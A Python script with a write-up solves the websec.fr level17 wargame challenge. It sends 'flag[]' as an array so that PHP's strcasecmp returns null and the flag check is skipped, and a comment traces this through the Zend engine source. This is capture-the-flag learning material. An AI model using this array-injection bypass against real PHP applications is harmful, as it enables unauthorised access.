import requests

url = "http://websec.fr/level17/index.php"

payload = {
    "flag[]": "676767", # by "casting" flag to array we are tricking strcasecmp to return null
    "submit": "Go"
}

r = requests.post(url, data=payload)
flag = r.text
s = flag.find("WEBSEC")
e = flag.find("}", s) + 1
print(flag[s:e])

"""
I looked at the source in php v5.3.29 (on later version it returns type error)

Cool vuln cause if u look at the source you see the function:
/usr/include/strings.h:115

/* Compare S1 and S2, ignoring case.  */
extern int strcasecmp (const char *__s1, const char *__s2)
     __THROW __attribute_pure__ __nonnull ((1, 2));

It seems valid, but if you explore more of the code you see that it gets exported through ZEND_FUNCTION.
The implementation looks like this:

/* {{{ proto int strcasecmp(string str1, string str2)
   Binary safe case-insensitive string comparison */
ZEND_FUNCTION(strcasecmp)
{
	char *s1, *s2;
	int s1_len, s2_len;

	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "ss", &s1, &s1_len, &s2, &s2_len) == FAILURE) {
		return;
	}

	RETURN_LONG(zend_binary_strcasecmp(s1, s1_len, s2, s2_len));
}
/* }}} */

Also it seems that they doesn't delegate to libc's function above because zend_binary_strcasecmp reimplements it:

ZEND_API int zend_binary_strcasecmp(const char *s1, uint len1, const char *s2, uint len2) /* {{{ */
{
	int len;
	int c1, c2;

	len = MIN(len1, len2);

	while (len--) {
		c1 = zend_tolower((int)*(unsigned char *)s1++);
		c2 = zend_tolower((int)*(unsigned char *)s2++);
		if (c1 != c2) {
			return c1 - c2;
		}
	}

	return len1 - len2;
}
/* }}} */


If we dive deep enough we are falling eventually in the following function,

ZEND_FUNCTION(strcasecmp)
  -> zend_parse_parameters("ss", ...)
     -> zend_parse_va_args
        -> zend_parse_arg
           -> zend_parse_arg_impl

In zend_parse_arg_impl (Zend/zend_API.c:400), the s specifier
switches on the zval type. Only IS_NULL/IS_STRING/IS_LONG/IS_DOUBLE/IS_BOOL
fall through to convert_to_string_ex. IS_ARRAY (along with IS_OBJECT and
IS_RESOURCE) hits the default arm and does:

        case IS_OBJECT:
        case IS_ARRAY:
        case IS_RESOURCE:
        default:
            return "string";

So convert_to_string_ex is never invoked for an array — the function
returns the C string "string" as the expected_type. In one function up our retval
enters a flow where we trigger a FAILURE retval, zend_parse_arg sees a non-NULL
expected_type, emits the warning:
 "strcasecmp() expects parameter N to be string, array given"

and returns FAILURE, and eventually the main function enters the if and exexcute `return;`
the vm pre-initialize the retval to ISNULL(=0) so when we are doing `return;` we are essentially returning null
"""
